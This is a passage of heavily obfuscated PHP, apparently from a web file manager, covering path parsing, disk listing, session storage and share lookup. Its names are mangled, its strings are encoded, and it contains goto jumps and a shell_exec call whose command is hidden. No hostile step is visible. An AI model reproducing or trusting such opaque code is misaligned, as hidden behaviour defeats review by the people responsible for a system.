³×ç . $…ãŸƒ¡¸[1288], $…ãŸƒ¡¸[1300] => rtrim(get_path_father($¸ ³×ç), $…ãŸƒ¡¸[8]) . $…ãŸƒ¡¸[8], $…ãŸƒ¡¸[429] => array()); $Â×œèÔ = IO::getContent($ú¦—Ì–[$…ãŸƒ¡¸[1301]]); if ($Â×œèÔ) { $Áî•¸†¼ = json_decode($Â×œèÔ, !0); if (is_array($Áî•¸†¼)) { $ú¦—Ì–[$…ãŸƒ¡¸[429]] = $Áî•¸†¼; } } return $ú¦—Ì–; } private static function saveData($˜òö«Û, $Ô¨ÑÛ¨‘) { $ö½ìóÚŠ =& $_SERVER[Ñ¯©ç]; self::log($ö½ìóÚŠ[1304] . $˜òö«Û . $ö½ìóÚŠ[84] . count($Ô¨ÑÛ¨‘), $ö½ìóÚŠ[804]); if ($Ô¨ÑÛ¨‘) { return IO::setContent($˜òö«Û, json_encode($Ô¨ÑÛ¨‘)); } $É½ğ—áÅ = IO::pathFather($˜òö«Û); IO::remove($˜òö«Û); self::clearEmptyFolder($É½ğ—áÅ); return !0; } public static function clearEmptyFolder($¡ôèİ‡) { $¿¾º çÏ =& $_SERVER[Ñ¯©ç]; if (trim($¡ôèİ‡, $¿¾º çÏ[8]) == trim(self::$_historyBase, $¿¾º çÏ[8])) { return; } $Ü¸€¢”á = IO::pathFather($¡ôèİ‡); $åæ‡¶Æ = IO::has($¡ôèİ‡, !0); if ($åæ‡¶Æ[$¿¾º çÏ[240]] > 0 || $åæ‡¶Æ[$¿¾º çÏ[241]] > 0) { return; } IO::remove($¡ôèİ‡); self::clearEmptyFolder($Ü¸€¢”á); } private static function getBasePath() { $ç´Ò»º¼ =& $_SERVER[Ñ¯©ç]; $ê”­»Çª = Model($ç´Ò»º¼[1305])->get($ç´Ò»º¼[1306]); if ($ê”­»Çª) { if (!IO::exist($ê”­»Çª)) { IO::mkdir($ê”­»Çª); } if (get_path_this($ê”­»Çª) == $ç´Ò»º¼[1291]) { $âˆâ¯Åå = $ç´Ò»º¼[1307] . rand_string(8); @rename($ê”­»Çª, get_path_father($ê”­»Çª) . $ç´Ò»º¼[8] . $âˆâ¯Åå); $ê”­»Çª = DATA_PATH . $âˆâ¯Åå . $ç´Ò»º¼[8]; file_put_contents(DATA_PATH . $ç´Ò»º¼[1241], $ç´Ò»º¼[12]); Model($ç´Ò»º¼[1305])->set($ç´Ò»º¼[1306], $ê”­»Çª); } return $ê”­»Çª; } $ê”­»Çª = DATA_PATH . $ç´Ò»º¼[1307] . rand_string(8) . $ç´Ò»º¼[8]; $ê”­»Çª = IO::mkdir($ê”­»Çª); $ê”­»Çª = rtrim($ê”­»Çª, $ç´Ò»º¼[8]) . $ç´Ò»º¼[8]; file_put_contents($ê”­»Çª . $ç´Ò»º¼[1241], $ç´Ò»º¼[12]); file_put_contents(DATA_PATH . $ç´Ò»º¼[1241], $ç´Ò»º¼[12]); Model($ç´Ò»º¼[1305])->set($ç´Ò»º¼[1306], $ê”­»Çª); return $ê”­»Çª; } } class KodIO { const KOD_SOURCE = "\173\x73\157\165\162\143\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\x72\122\x65\x63\x79\143\x6c\145\175"; const KOD_USER_FAV = "\173\165\163\x65\x72\106\x61\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\145\162\106\x69\x6c\x65\124\x61\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\x72\x46\151\154\145\x54\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\157\x75\160\122\x6f\157\x74\x53\x65\154\146\175"; const KOD_USER_SHARE = "\x7b\165\163\145\162\x53\150\141\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\163\x65\x72\x53\150\x61\162\145\x4c\x69\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\141\162\145\x54\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\150\141\162\x65\x49\164\145\155\x7d"; const KOD_SHARE_LINK = "\173\163\150\141\x72\x65\111\x74\145\x6d\114\151\156\153\175"; const KOD_SEARCH = "\x7b\163\145\x61\162\x63\x68\x7d"; const KOD_BLOCK = "\173\142\x6c\x6f\143\153\x7d"; const KOD_IO = "\173\151\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\145\162\122\145\156\x63\x65\156\x74\175"; const KOD_USER_DRIVER = "\173\x64\x72\151\166\145\x72\175"; public static function typeList() { $¸ÔİÎ’ =& $_SERVER[Ñ¯©ç]; return array($¸ÔİÎ’[1308] => self::KOD_SOURCE, $¸ÔİÎ’[1309] => self::KOD_USER_RECYCLE, $¸ÔİÎ’[1310] => self::KOD_USER_FAV, $¸ÔİÎ’[1311] => self::KOD_USER_FILE_TAG, $¸ÔİÎ’[1312] => self::KOD_USER_FILE_TYPE, $¸ÔİÎ’[1313] => self::KOD_GROUP_ROOT_SELF, $¸ÔİÎ’[1314] => self::KOD_USER_SHARE, $¸ÔİÎ’[1315] => self::KOD_USER_SHARE_LINK, $¸ÔİÎ’[1316] => self::KOD_USER_SHARE_TO_ME, $¸ÔİÎ’[1317] => self::KOD_SHARE_ITEM, $¸ÔİÎ’[1318] => self::KOD_SHARE_LINK, $¸ÔİÎ’[1319] => self::KOD_SEARCH, $¸ÔİÎ’[1320] => self::KOD_BLOCK, $¸ÔİÎ’[1321] => self::KOD_IO, $¸ÔİÎ’[1322] => self::KOD_USER_RECENT, $¸ÔİÎ’[1323] => self::KOD_USER_DRIVER); } public static function parse($¾ÃçŒ°) { $øúÉ¨ïÒ =& $_SERVER[Ñ¯©ç]; $¾ÃçŒ° = self::clear($¾ÃçŒ°); $çìªÂßÚ = array_values(self::typeList()); preg_match($øúÉ¨ïÒ[1324], $¾ÃçŒ°, $ÏÌÛşÃî); $»©ğ×–ù = array($øúÉ¨ïÒ[479] => !1, $øúÉ¨ïÒ[1325] => !1, $øúÉ¨ïÒ[476] => !1, $øúÉ¨ïÒ[97] => $¾ÃçŒ°, $øúÉ¨ïÒ[1226] => !1, $øúÉ¨ïÒ[1225] => $øúÉ¨ïÒ[12]); if (is_array($ÏÌÛşÃî) && count($ÏÌÛşÃî) == 5) { $Ÿé¯“Ø = $øúÉ¨ïÒ[1326] . $ÏÌÛşÃî[2] . $øúÉ¨ïÒ[387]; if (in_array($Ÿé¯“Ø, $çìªÂßÚ)) { $»©ğ×–ù[$øúÉ¨ïÒ[1226]] = $ÏÌÛşÃî[1]; $»©ğ×–ù[$øúÉ¨ïÒ[33]] = $Ÿé¯“Ø; $»©ğ×–ù[$øúÉ¨ïÒ[1327]] = substr($Ÿé¯“Ø, 1, -1); $»©ğ×–ù[$øúÉ¨ïÒ[458]] = $ÏÌÛşÃî[3]; } $»©ğ×–ù[$øúÉ¨ïÒ[1225]] = $ÏÌÛşÃî[4]; } $îÅ÷«‚ = array($øúÉ¨ïÒ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $»©ğ×–ù[$øúÉ¨ïÒ[1290]] = in_array($»©ğ×–ù[$øúÉ¨ïÒ[33]], $îÅ÷«‚); return $»©ğ×–ù; } public static function isTruePath($ññ¥êÃå) { $ºöÓøÄ¥ =& $_SERVER[Ñ¯©ç]; if (substr($ññ¥êÃå, 0, 1) != $ºöÓøÄ¥[1326]) { return !0; } if (strpos($ññ¥êÃå, $ºöÓøÄ¥[466]) === 0) { return !0; } if (strpos($ññ¥êÃå, $ºöÓøÄ¥[1294]) === 0) { return !0; } if (strpos($ññ¥êÃå, $ºöÓøÄ¥[1328]) === 0) { return !0; } if (strpos($ññ¥êÃå, $ºöÓøÄ¥[1329]) === 0) { return !0; } if (strpos($ññ¥êÃå, $ºöÓøÄ¥[1330]) === 0) { return !0; } return !1; } public static function clear($Ÿ•³òîû) { $ò™£Òãô =& $_SERVER[Ñ¯©ç]; $Ÿ•³òîû = str_replace(array($ò™£Òãô[1132], $ò™£Òãô[59]), $ò™£Òãô[53], $Ÿ•³òîû); $Ÿ•³òîû = str_replace($ò™£Òãô[110], $ò™£Òãô[8], $Ÿ•³òîû); $¼Ë›¾Òª = $ò™£Òãô[1331]; if (substr($Ÿ•³òîû, 0, 3) == $ò™£Òãô[1332]) { $Ÿ•³òîû = substr($Ÿ•³òîû, 3); } while (strstr($Ÿ•³òîû, $¼Ë›¾Òª)) { $Ÿ•³òîû = str_replace($¼Ë›¾Òª, $ò™£Òãô[8], $Ÿ•³òîû); } $Ÿ•³òîû = preg_replace($ò™£Òãô[1333], $ò™£Òãô[8], $Ÿ•³òîû); if ($Ÿ•³òîû == $ò™£Òãô[8]) { return $ò™£Òãô[8]; } $Ÿ•³òîû = rtrim($Ÿ•³òîû, $ò™£Òãô[8]); return $Ÿ•³òîû; } public static function pathTrue($Š’‚ÅÖ“) { $÷˜–üŠÏ =& $_SERVER[Ñ¯©ç]; if (!$Š’‚ÅÖ“) { return $÷˜–üŠÏ[12]; } $Š’‚ÅÖ“ = str_replace($÷˜–üŠÏ[576], $÷˜–üŠÏ[8], str_replace($÷˜–üŠÏ[1334], $÷˜–üŠÏ[8], $Š’‚ÅÖ“)); $Š’‚ÅÖ“ = str_replace($÷˜–üŠÏ[576], $÷˜–üŠÏ[8], str_replace($÷˜–üŠÏ[1334], $÷˜–üŠÏ[8], $Š’‚ÅÖ“)); if (!strstr($Š’‚ÅÖ“, $÷˜–üŠÏ[1332])) { return $Š’‚ÅÖ“; } $Ş©‚Şù = explode($÷˜–üŠÏ[8], $Š’‚ÅÖ“); foreach ($Ş©‚Şù as $¹æÚ‚„î => $•·ÑÊš½) { if ($•·ÑÊš½ !== $÷˜–üŠÏ[1335]) { continue; } for ($Á€±îÓ• = $¹æÚ‚„î; $Á€±îÓ• >= 0; $Á€±îÓ•--) { if ($Ş©‚Şù[$Á€±îÓ•] === $÷˜–üŠÏ[10] || $Ş©‚Şù[$Á€±îÓ•] === $÷˜–üŠÏ[1335] || $Ş©‚Şù[$Á€±îÓ•] === -1) { continue; } if ($Ş©‚Şù[$Á€±îÓ•] === $÷˜–üŠÏ[12]) { $Ş©‚Şù[$¹æÚ‚„î] = -1; break; } $Ş©‚Şù[$¹æÚ‚„î] = -1; $Ş©‚Şù[$Á€±îÓ•] = -1; break; } } $îªËÖê‚ = array(); foreach ($Ş©‚Şù as $•·ÑÊš½) { if ($•·ÑÊš½ !== -1) { $îªËÖê‚[] = $•·ÑÊš½; } } $ö¥¿Şˆ = implode($÷˜–üŠÏ[8], $îªËÖê‚); if (strpos($ö¥¿Şˆ, $÷˜–üŠÏ[1336]) === 0) { $ö¥¿Şˆ = $÷˜–üŠÏ[1332] . substr($ö¥¿Şˆ, strlen($÷˜–üŠÏ[1336])); } return $ö¥¿Şˆ; } public static function sourceID($°¤Ô«•­) { $Ê‡ ¼¤ë =& $_SERVER[Ñ¯©ç]; $‹ùó‚ô = self::parse($°¤Ô«•­); if ($‹ùó‚ô[$Ê‡ ¼¤ë[33]] !== self::KOD_SOURCE) { show_json(LNG($Ê‡ ¼¤ë[1337]), !1); } return $‹ùó‚ô[$Ê‡ ¼¤ë[458]]; } public static function make($¯âÄ´Äè) { if (!$¯âÄ´Äè) { return !1; } return self::makePath(self::KOD_SOURCE, intval($¯âÄ´Äè)); } public static function makeShare($¯ºß‚Ñí, $ÌÁ±Àß“) { return self::makePath(self::KOD_SHARE_ITEM, $¯ºß‚Ñí, $ÌÁ±Àß“); } public static function makeFileTypePath($ÔŠ­À ¿) { return self::makePath(self::KOD_USER_FILE_TYPE, $ÔŠ­À ¿); } public static function makeFileTagPath($€ƒÙÌà) { return self::makePath(self::KOD_USER_FILE_TAG, $€ƒÙÌà); } public static function makePath($Æ„†çû, $¯¢‚¬ŒÒ = '', $ˆ®²óÓ¼ = '') { $ƒÀ‚–ˆ‚ =& $_SERVER[Ñ¯©ç]; $ ™ÙÌ¹ = substr($Æ„†çû, 1, -1); $ĞåúÈÙÍ = $ƒÀ‚–ˆ‚[1338] . $ ™ÙÌ¹ . $ƒÀ‚–ˆ‚[1339] . $¯¢‚¬ŒÒ . $ƒÀ‚–ˆ‚[1340]; $ĞåúÈÙÍ = $ˆ®²óÓ¼ ? $ĞåúÈÙÍ . $ˆ®²óÓ¼ . $ƒÀ‚–ˆ‚[8] : $ĞåúÈÙÍ; return $ĞåúÈÙÍ; } public static function hashPath($Å†øÁâ’, $Üš¬ÃäÃ = true) { $şÂ»›Õ¦ =& $_SERVER[Ñ¯©ç]; $Ëô™›ş = is_array($Å†øÁâ’) ? $Å†øÁâ’ : IO::info($Å†øÁâ’); $ƒ§‚ıª› = _get($Ëô™›ş, $şÂ»›Õ¦[1341], $şÂ»›Õ¦[12]); if (!$ƒ§‚ıª› && isset($Ëô™›ş[$şÂ»›Õ¦[236]])) { $ƒ§‚ıª› = trim($Ëô™›ş[$şÂ»›Õ¦[236]], $şÂ»›Õ¦[131]); } if (!$ƒ§‚ıª› && isset($Ëô™›ş[$şÂ»›Õ¦[194]]) && $Ëô™›ş[$şÂ»›Õ¦[194]]) { $Ëô™›ş = IO::info(KodIO::make($Ëô™›ş[$şÂ»›Õ¦[194]])); $ƒ§‚ıª› = _get($Ëô™›ş, $şÂ»›Õ¦[1341], $şÂ»›Õ¦[12]); } $«öŸ½ï = md5($Ëô™›ş[$şÂ»›Õ¦[97]] . $Ëô™›ş[$şÂ»›Õ¦[89]] . $Ëô™›ş[$şÂ»›Õ¦[98]]); if (!$ƒ§‚ıª› && file_exists($Ëô™›ş[$şÂ»›Õ¦[97]])) { $ƒ§‚ıª› = Cache::get($«öŸ½ï . $şÂ»›Õ¦[1342]); $ƒ§‚ıª› = !1; if (!$ƒ§‚ıª›) { $ƒ§‚ıª› = IO::hashSimple($Ëô™›ş[$şÂ»›Õ¦[97]]); Cache::set($«öŸ½ï . $şÂ»›Õ¦[1342], $ƒ§‚ıª›, 3600 * 24 * 30); } } if ($Üš¬ÃäÃ && !$ƒ§‚ıª›) { } return $ƒ§‚ıª› ? $ƒ§‚ıª› : $«öŸ½ï; } public static function hashPathSafe($ÍÍÂ§‡Ë, $ÈÁ·˜ğê = true) { $È€œ×Åù =& $_SERVER[Ñ¯©ç]; $—¶Ò·ØÌ = self::hashPath($ÍÍÂ§‡Ë, $ÈÁ·˜ğê); return md5($—¶Ò·ØÌ . $È€œ×Åù[1343] . Model($È€œ×Åù[823])->get($È€œ×Åù[824])); } public static function initSystemPath() { $Áò©—Õ¯ =& $_SERVER[Ñ¯©ç]; if (defined($Áò©—Õ¯[1344])) { return; } define($Áò©—Õ¯[1344], self::systemPath($Áò©—Õ¯[192])); define($Áò©—Õ¯[1345], self::systemPath($Áò©—Õ¯[1346])); define($Áò©—Õ¯[1347], self::systemPath($Áò©—Õ¯[1348])); define($Áò©—Õ¯[1349], self::systemPath($Áò©—Õ¯[1350])); IOHistory::bindEvent(); } public static function systemPath($±œàö¼Ï) { $Â±˜èÜ =& $_SERVER[Ñ¯©ç]; $ö ¦ÉëÛ = $Â±˜èÜ[1351] . ucfirst($±œàö¼Ï); $òÒıÑ”é = Model($Â±˜èÜ[823])->get($ö ¦ÉëÛ); if ($òÒıÑ”é) { return $òÒıÑ”é; } if ($±œàö¼Ï == $Â±˜èÜ[192]) { $òÒıÑ”é = self::make(Model($Â±˜èÜ[877])->systemRootPathAdd($Â±˜èÜ[589])); } else { $òÒıÑ”é = self::systemPath($Â±˜èÜ[192]); $âßó´™Ø = self::sourceID($òÒıÑ”é); $òÒıÑ”é = self::make(Model($Â±˜èÜ[877])->mkdir($âßó´™Ø, $±œàö¼Ï)); } Model($Â±˜èÜ[823])->set($ö ¦ÉëÛ, $òÒıÑ”é); return $òÒıÑ”é; } public static function systemFolder($øšó­) { $ë’¨ä¿¬ = IO_PATH_SYSTEM_SOURCE . $øšó­; $Çé©…½ô = Cache::get($ë’¨ä¿¬); if (!$Çé©…½ô) { $ş¿×ÉåŸ = IO::infoFullSimple($ë’¨ä¿¬); if (!$ş¿×ÉåŸ) { $Çé©…½ô = IO::mkdir($ë’¨ä¿¬, REPEAT_SKIP); } else { $Çé©…½ô = $ş¿×ÉåŸ[$_SERVER[Ñ¯©ç][97]]; } Cache::set($ë’¨ä¿¬, $Çé©…½ô, 3600 * 10); } return $Çé©…½ô; } public static function defaultDriver() { return Model($_SERVER[Ñ¯©ç][820])->defaultDriver(); } public static function defaultIO() { $ïˆš‹‚Ó =& $_SERVER[Ñ¯©ç]; $å¸ÂËü = self::defaultDriver(); return $ïˆš‹‚Ó[1352] . $å¸ÂËü[$ïˆš‹‚Ó[458]] . $ïˆš‹‚Ó[1340]; } public static function defaultDriverInit() { static $ñÒ“ãİ = false; if ($ñÒ“ãİ) { return $ñÒ“ãİ; } $ñÒ“ãİ = IO::init(self::defaultIO()); return $ñÒ“ãİ; } public static function fileTypeList() { $Á¸Å‡Å¾ =& $_SERVER[Ñ¯©ç]; $ªˆîèÒä = $GLOBALS[$Á¸Å‡Å¾[6]][$Á¸Å‡Å¾[1353]]; foreach ($ªˆîèÒä as $ºşó°’à => $Ä¿‘©¥) { $è´¬¬° = $Á¸Å‡Å¾[1354] . $ºşó°’à; $«²Œƒ˜» = LNG($è´¬¬°); if ($è´¬¬° != $«²Œƒ˜») { $ªˆîèÒä[$ºşó°’à][$Á¸Å‡Å¾[32]] = $«²Œƒ˜»; } } return $ªˆîèÒä; } public static function diskList($íØ¶í¥ = true) { $’ãú½µó = $_SERVER[Ñ¯©ç][1355]; if ($íØ¶í¥) { $›¼Ï­åÇ = Cache::get($’ãú½µó); if (is_array($›¼Ï­åÇ)) { return $›¼Ï­åÇ; } } $›¼Ï­åÇ = self::diskListGet(); Cache::set($’ãú½µó, $›¼Ï­åÇ, 60); return $›¼Ï­åÇ; } public static function diskListGet() { $€†öÜ– =& $_SERVER[Ñ¯©ç]; $Â—µ˜Ìı = array(); if ($GLOBALS[$€†öÜ–[6]][$€†öÜ–[1356]] == $€†öÜ–[1357]) { $¡ì¢í†Š = $€†öÜ–[1358]; for ($¤‡¹„Îâ = 0; $¤‡¹„Îâ < strlen($¡ì¢í†Š); $¤‡¹„Îâ++) { $Ú£Îšìä = $¡ì¢í†Š[$¤‡¹„Îâ] . $€†öÜ–[1359]; if (file_exists($Ú£Îšìä)) { $Â—µ˜Ìı[] = $Ú£Îšìä; } } return $Â—µ˜Ìı; } if (!function_exists($€†öÜ–[111])) { $Â—µ˜Ìı[] = $€†öÜ–[888]; return $Â—µ˜Ìı; } $±—ñú¯ = explode($€†öÜ–[59], shell_exec($€†öÜ–[1360])); array_shift($±—ñú¯); array_pop($±—ñú¯); $©ÅùŞñ„ = array($€†öÜ–[1361], $€†öÜ–[1362], $€†öÜ–[1363], $€†öÜ–[1364], $€†öÜ–[1365], $€†öÜ–[1366], $€†öÜ–[1367], $€†öÜ–[1368]); foreach ($±—ñú¯ as $Á¹ç³™÷) { $šßğ¡ = preg_split($€†öÜ–[1369], $Á¹ç³™÷); $Ú£Îšìä = $šßğ¡[count($šßğ¡) - 1]; if (!strstr($šßğ¡[0], $€†öÜ–[1370]) || !$Ú£Îšìä) { continue; } $„Ú¦ïœ· = rtrim($Ú£Îšìä, $€†öÜ–[8]) . $€†öÜ–[8]; if (in_array($„Ú¦ïœ·, $©ÅùŞñ„)) { continue; } $Â—µ˜Ìı[] = $„Ú¦ïœ·; } return $Â—µ˜Ìı; } public static function isSameDisk($ÌëÅô¯, $’Üä¯¨À) { $ßíŞÆŸ“ =& $_SERVER[Ñ¯©ç]; if ($GLOBALS[$ßíŞÆŸ“[6]][$ßíŞÆŸ“[1356]] == $ßíŞÆŸ“[1357]) { return strtolower(substr($ÌëÅô¯, 0, 1)) == strtolower(substr($’Üä¯¨À, 0, 1)); } $É—ø°¯É = self::diskList(); $ñ«ĞàÓ = !1; $ªŠ•ƒíÌ = !1; sort($É—ø°¯É); $É—ø°¯É = array_reverse($É—ø°¯É); $ÌëÅô¯ = rtrim($ÌëÅô¯, $ßíŞÆŸ“[8]) . $ßíŞÆŸ“[8]; $’Üä¯¨À = rtrim($’Üä¯¨À, $ßíŞÆŸ“[8]) . $ßíŞÆŸ“[8]; foreach ($É—ø°¯É as $ÖéıŠÊ¯) { $ÃÒ¬øı = strlen($ÖéıŠÊ¯); if (!$ñ«ĞàÓ && substr($ÌëÅô¯, 0, $ÃÒ¬øı) == $ÖéıŠÊ¯) { $ñ«ĞàÓ = $ÖéıŠÊ¯; } if (!$ªŠ•ƒíÌ && substr($’Üä¯¨À, 0, $ÃÒ¬øı) == $ÖéıŠÊ¯) { $ªŠ•ƒíÌ = $ÖéıŠÊ¯; } if ($ñ«ĞàÓ && $ªŠ•ƒíÌ) { break; } } return $ñ«ĞàÓ === $ªŠ•ƒíÌ; } public static function transferType($ÕÔğ¼ü, $›Û²ïİî) { $Š ™¦Í =& $_SERVER[Ñ¯©ç]; $âªŠâÚ = self::driverType($ÕÔğ¼ü); $Ñšë¨ÓÈ = self::driverType($›Û²ïİî); if ($âªŠâÚ[$Š ™¦Í[33]] == $Ñšë¨ÓÈ[$Š ™¦Í[33]] && $âªŠâÚ[$Š ™¦Í[1371]] == $Ñšë¨ÓÈ[$Š ™¦Í[1371]]) { return $Š ™¦Í[1372]; } if ($âªŠâÚ[$Š ™¦Í[33]] == $Š ™¦Í[921] && $Ñšë¨ÓÈ[$Š ™¦Í[33]] == $Š ™¦Í[119]) { return $Š ™¦Í[1251]; } if ($âªŠâÚ[$Š ™¦Í[33]] == $Š ™¦Í[119] && $Ñšë¨ÓÈ[$Š ™¦Í[33]] == $Š ™¦Í[921]) { return $Š ™¦Í[120]; } return $Š ™¦Í[1373]; } public static function driverType($İÒÌ£±„) { $°”ÜÂ˜Ô =& $_SERVER[Ñ¯©ç]; $Áû¾ÉÍŞ = str_replace($°”ÜÂ˜Ô[1374], $°”ÜÂ˜Ô[12], strtolower($İÒÌ£±„->getType())); if ($Áû¾ÉÍŞ == $°”ÜÂ˜Ô[810] || $Áû¾ÉÍŞ == $°”ÜÂ˜Ô[1375] || $Áû¾ÉÍŞ == $°”ÜÂ˜Ô[1376]) { $İÒÌ£±„ = self::defaultDriverInit(); } else { if ($Áû¾ÉÍŞ == $°”ÜÂ˜Ô[1261] || $Áû¾ÉÍŞ == $°”ÜÂ˜Ô[1377]) { $İÒÌ£±„ = IO::init($İÒÌ£±„->pathParse[$°”ÜÂ˜Ô[1207]]); } } $öãÑÄÙ® = $İÒÌ£±„->path; $Áû¾ÉÍŞ = str_replace($°”ÜÂ˜Ô[1374], $°”ÜÂ˜Ô[12], strtolower($İÒÌ£±„->getType())); if ($Áû¾ÉÍŞ == $°”ÜÂ˜Ô[119]) { return array($°”ÜÂ˜Ô[33] => $°”ÜÂ˜Ô[119], $°”ÜÂ˜Ô[1371] => $°”ÜÂ˜Ô[12], $°”ÜÂ˜Ô[97] => $öãÑÄÙ®, $°”ÜÂ˜Ô[108] => $İÒÌ£±„); } return array($°”ÜÂ˜Ô[33] => $°”ÜÂ˜Ô[921], $°”ÜÂ˜Ô[1371] => $İÒÌ£±„->pathDriver, $°”ÜÂ˜Ô[97] => $öãÑÄÙ®, $°”ÜÂ˜Ô[108] => $İÒÌ£±„); } public static function pathDriverType($¿ÎÀÕŞÂ) { return $¿ÎÀÕŞÂ ? self::driverType(IO::init($¿ÎÀÕŞÂ)) : !1; } public static function pathDriverLocal($˜éúó››) { $ˆßâñÊ =& $_SERVER[Ñ¯©ç]; $ğâßğõØ = $˜éúó›› ? self::driverType(IO::init($˜éúó››)) : !1; return $ğâßğõØ[$ˆßâñÊ[33]] == $ˆßâñÊ[119] ? !0 : !1; } public static function allowCover($¡îÀ÷óñ, $ò©ïûİ¦ = true) { $½õ°ØŠ =& $_SERVER[Ñ¯©ç]; if (is_string($¡îÀ÷óñ)) { $¡îÀ÷óñ = IO::info($¡îÀ÷óñ); } if (!$¡îÀ÷óñ || $¡îÀ÷óñ[$½õ°ØŠ[33]] == $½õ°ØŠ[88] || $¡îÀ÷óñ[$½õ°ØŠ[89]] <= 100) { return !1; } if (isset($¡îÀ÷óñ[$½õ°ØŠ[1378]]) || !$¡îÀ÷óñ[$½õ°ØŠ[97]]) { return !1; } if (isset($¡îÀ÷óñ[$½õ°ØŠ[233]]) && !$¡îÀ÷óñ[$½õ°ØŠ[233]]) { return !1; } static $ üà–ø² = false; if (!$ üà–ø² || !$ò©ïûİ¦) { $ãŠË¥Ìó = self::driverType(IO::init($¡îÀ÷óñ[$½õ°ØŠ[97]])); $ÓèÍÍÑª = $ãŠË¥Ìó[$½õ°ØŠ[108]]; $ üà–ø² = $½õ°ØŠ[197]; if ($ãŠË¥Ìó[$½õ°ØŠ[33]] == $½õ°ØŠ[119]) { $ üà–ø² = $½õ°ØŠ[1379]; } if ($ãŠË¥Ìó[$½õ°ØŠ[108]] && is_array($ãŠË¥Ìó[$½õ°ØŠ[108]]->config)) { $ÑôÅã÷’ = $ãŠË¥Ìó[$½õ°ØŠ[108]]->config; if (isset($ÑôÅã÷’[$½õ°ØŠ[1380]]) && $ÑôÅã÷’[$½õ°ØŠ[1380]]) { $ üà–ø² = $½õ°ØŠ[1379]; } } } return $ üà–ø² == $½õ°ØŠ[1379] ? !0 : !1; } } goto f‚½£®É˜­; Dç¾‘ŸœâË: class SessionModel extends ModelBase { protected $tableName = "\163\171\163\164\145\155\x5f\163\x65\163\x73\x69\157\x6e"; public function get($¨İéŒÊª) { $ ‰°ŞÔ¬ =& $_SERVER[Ñ¯©ç]; $‰Ñìõ Ü = $this->where(array($ ‰°ŞÔ¬[2091] => $¨İéŒÊª))->find(); if (!is_array($‰Ñìõ Ü)) { return !1; } return $‰Ñìõ Ü[$ ‰°ŞÔ¬[807]]; } public function set($·óöë­å, $Çù—½ùÔ, $»à¢‘Ê¿ = 3600) { $èéë©”” =& $_SERVER[Ñ¯©ç]; $»î‰€‡ = array($èéë©””[2091] => $·óöë­å, $èéë©””[1994] => $Çù—½ùÔ, $èéë©””[2092] => $»à¢‘Ê¿ + time()); if (Session::get($èéë©””[2093])) { $»î‰€‡[$èéë©””[1757]] = Session::get($èéë©””[2093]); } else { $»î‰€‡[$èéë©””[1757]] = 0; } if ($this->get($·óöë­å)) { return $this->where(array($èéë©””[2091] => $·óöë­å))->save($»î‰€‡); } else { return $this->add($»î‰€‡, array(), !0); } } public function remove($éº¶Ë¤³) { return $this->where(array($_SERVER[Ñ¯©ç][2091] => $éº¶Ë¤³))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ñ¯©ç][2094] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\x72\x65"; protected $dataAuto = array(array("\155\157\144\x69\146\171\x54\x69\155\x65", "\x74\151\155\145", "\151\x6e\163\145\162\164\54\x75\160\144\x61\164\x65", "\x66\165\x6e\x63\x74\151\x6f\156"), array("\143\162\145\141\164\145\124\x69\155\x65", "\164\151\x6d\x65", "\x69\156\x73\x65\x72\164", "\x66\x75\x6e\x63\x74\x69\157\156"), array("\x6f\x70\x74\151\157\156\x73", '', "\x69\x6e\163\145\x72\164\54\165\x70\x64\141\x74\x65\54\x73\x65\x6c\145\143\x74", "\152\x73\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($ìÛçè) { $Ê•»‡Í =& $_SERVER[Ñ¯©ç]; $«ˆâŒáë = isset($ìÛçè[0]) ? $ìÛçè[0] : !1; return array($Ê•»‡Í[2095] => array(USER_ID, $Ê•»‡Í[2096]), $Ê•»‡Í[2036] => array($«ˆâŒáë, $Ê•»‡Í[2097])); } protected function listSimple() { $àúò¢Š = array($_SERVER[Ñ¯©ç][1757] => USER_ID); $š¨«²° = $this->field($this->fieldList)->where($àúò¢Š)->select(); return $š¨«²° ? $š¨«²° : array(); } protected function getInfo($‘Ö§æš‚, $ëì¸¿óŠ = false) { $°¶¿áº =& $_SERVER[Ñ¯©ç]; if ($ëì¸¿óŠ) { return $this->_getShareInfo(array($°¶¿áº[648] => $‘Ö§æš‚)); } $ ‚®Š… = $this->cacheFunctionGet($°¶¿áº[2038], $‘Ö§æš‚); return $ ‚®Š…; } public function getInfoByHash($÷ı±”Ú ) { return $this->_getShareInfo(array($_SERVER[Ñ¯©ç][2098] => $÷ı±”Ú )); } public function getInfoByPath($Äóß¨Ñ‡) { $òë—ù±© =& $_SERVER[Ñ¯©ç]; $ş¬¹àÛÖ = array($òë—ù±©[1757] => USER_ID, $òë—ù±©[194] => $Äóß¨Ñ‡); return $this->_getShareInfo($ş¬¹àÛÖ); } public function getInfoBySourcePath($¢½´¼à§) { $©Ôªï©° =& $_SERVER[Ñ¯©ç]; $Œá…šáµ = array($©Ôªï©°[1757] => USER_ID, $©Ôªï©°[1232] => $¢½´¼à§); return $this->_getShareInfo($Œá…šáµ); } private function _getShareInfo($õÅÁöĞğ) { $©Üèœ¡¾ =& $_SERVER[Ñ¯©ç]; $ë®ĞŞŠá = $this->where($õÅÁöĞğ)->find(); if (!$ë®ĞŞŠá) { return !1; } $õÅÁöĞğ = array($©Üèœ¡¾[648] => $ë®ĞŞŠá[$©Üèœ¡¾[648]]); $¾±½¨¡ = $©Üèœ¡¾[2099]; $¬ÍÆ¯… = Model($©Üèœ¡¾[649])->order($©Üèœ¡¾[458])->field($¾±½¨¡)->where($õÅÁöĞğ)->select(); if ($ë®ĞŞŠá[$©Üèœ¡¾[194]] == $©Üèœ¡¾[229]) { $ë®ĞŞŠá[$©Üèœ¡¾[100]] = IO::info($ë®ĞŞŠá[$©Üèœ¡¾[1232]]); } else { $ë®ĞŞŠá[$©Üèœ¡¾[100]] = 